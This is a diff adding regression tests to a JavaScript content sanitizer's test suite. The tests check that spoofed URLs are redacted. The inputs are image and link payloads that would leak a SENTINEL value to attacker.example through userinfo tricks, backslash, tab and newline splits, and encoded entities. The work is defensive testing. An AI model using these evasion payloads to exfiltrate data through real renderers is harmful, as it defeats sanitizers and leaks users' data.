@@ -1479,6 +1479,99 @@ describe("sanitize_content.cjs", () => {
       const result = sanitizeContent("https://github.com//issues");
       expect(result).toContain("https://github.com//issues");
     });
+
+    // A URL-spoofing check is only as good as its agreement with the parser that
+    // will eventually fetch the URL. Each case below is a place where the
+    // sanitizer's regex view of "where does the authority end" or "where does a
+    // URL begin" once diverged from a browser's, letting a spoofed host through.
+
+    it("should strip userinfo from a spoofed URL that immediately follows another URL", () => {
+      // A greedy authority once swallowed the "," and the following "https:",
+      // so the global scan resumed past the second URL and never stripped it.
+      const result = sanitizeContent("https://github.com/a,https://github.com@attacker.example/p?leak=SENTINEL");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should strip userinfo from adjacent protocol-relative markdown images", () => {
+      const result = sanitizeContent("![a](//x.example)![b](//github.com@attacker.example/p.gif?leak=SENTINEL)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host in a CommonMark angle-bracket link destination", () => {
+      const result = sanitizeContent("![p](<//github.com@attacker.example/pixel.gif?leak=SENTINEL>)");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host in an unquoted HTML src attribute", () => {
+      const result = sanitizeContent("<img src=//github.com@attacker.example/p.gif?leak=SENTINEL>");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host behind backslash separators", () => {
+      // URL parsers treat "\" as "/" for special schemes, so \\host resolves
+      // exactly like //host.
+      const result = sanitizeContent('<img src="\\\\github.com@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host behind a mixed slash-backslash separator", () => {
+      const result = sanitizeContent('<img src="/\\github.com@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a disallowed host behind backslash separators without userinfo", () => {
+      const result = sanitizeContent('<img src="\\\\attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by a tab, which URL parsers discard", () => {
+      const result = sanitizeContent('<img src="//github.com\tA@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by an encoded tab entity", () => {
+      const result = sanitizeContent('<img src="//github.com&#9;A@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed host split by a newline, which URL parsers discard", () => {
+      const result = sanitizeContent('<img src="//github.com\nA@attacker.example/p.gif?leak=SENTINEL">');
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should redact a spoofed protocol-relative host in a query parameter", () => {
+      const result = sanitizeContent("https://github.com/a?redirect=//github.com@attacker.example/p?leak=SENTINEL");
+      expect(result).toContain("(attacker.example/redacted)");
+      expect(result).not.toContain("SENTINEL");
+    });
+
+    it("should not redact an allowed host that merely follows a newline in prose", () => {
+      // Tab/CR/LF are tolerated inside an authority only to defeat the parser
+      // differential above; an ordinary host followed by prose must be intact.
+      const result = sanitizeContent("//github.com/repo\nnext line of prose");
+      expect(result).toContain("//github.com/repo");
+      expect(result).toContain("next line of prose");
+    });
+
+    it("should not redact an allowed protocol-relative URL in a query parameter", () => {
+      const result = sanitizeContent("https://github.com/a?redirect=//github.com/b");
+      expect(result).toContain("https://github.com/a?redirect=//github.com/b");
+    });
+
+    it("should leave Windows-style paths untouched", () => {
+      const result = sanitizeContent("C:\\Users\\me\\file.txt");
+      expect(result).toContain("C:\\Users\\me\\file.txt");
+    });
   });
 
   describe("domain sanitization", () => {
